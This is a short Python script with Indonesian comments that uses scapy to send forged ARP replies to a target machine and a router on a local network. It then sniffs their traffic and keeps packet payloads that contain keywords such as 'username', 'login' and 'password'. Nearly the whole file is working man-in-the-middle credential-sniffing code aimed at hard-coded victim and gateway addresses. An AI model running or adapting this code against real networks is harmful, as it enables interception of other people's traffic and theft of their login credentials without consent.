import scapy.all as scapy
# from scapy.all import ARP, Ether, sniff as scapy
import netfilterqueue

# Fungsi untuk menampilkan paket
def packet_callback(packet):
    # scapy_packet = scapy.IP(packet.get_payload())
    # print(scapy_packet)
    # print(packet)
    # if packet.haslayer(scapy.IP):
    #     print(scapy.IP().show())
    # else:
    #     print("tidak ada")
    if packet.haslayer(scapy.Raw):
        # Menampilkan informasi paket yang dikirim dan diterima
        load = packet[scapy.Raw].load
        # print(load)
        keywords = [b"username", b"user", b"login", b"password", b"pass", b"uname", b"pass"]
        for keyword in keywords:
            if keyword in load:
                return load


# Fungsi untuk melakukan ARP spoofing
def arp_spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="9c:2e:a1:de:d4:4d", psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# Alamat IP target yang akan di-spoof (misalnya, IP korban)
target_ip = "192.168.1.7"
# Alamat IP yang akan dispoof (misalnya, alamat IP dari router)
spoof_ip = "192.168.1.1"

# Memulai ARP spoofing
arp_spoof(target_ip, spoof_ip)
arp_spoof(spoof_ip, target_ip)

# Menangkap dan menampilkan paket yang dikirim dan diterima
scapy.sniff(prn=packet_callback, filter="host " + target_ip + " or host " + spoof_ip, store=0)

